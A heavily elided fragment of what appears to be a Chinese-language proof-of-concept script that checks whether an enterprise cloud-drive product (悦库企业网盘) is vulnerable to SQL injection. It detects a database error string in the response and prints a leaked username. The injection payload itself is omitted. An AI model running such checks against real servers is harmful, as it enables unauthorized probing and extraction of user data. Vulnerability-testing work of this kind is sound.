...
![](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240909205201138.png)
...
def main():
    banner()
    parser = argparse.ArgumentParser(description='悦库企业网盘存在SQL注入漏洞')
...
def poc(target):
    ...
    try:
        ...
        if res.status_code == 200 and 'SQLSTATE[HY000]' in res.text:
            print(f"{GREEN}[+]该url存在SQL注入漏洞: {target}{RESET},用户名为:{match.group(1)}")
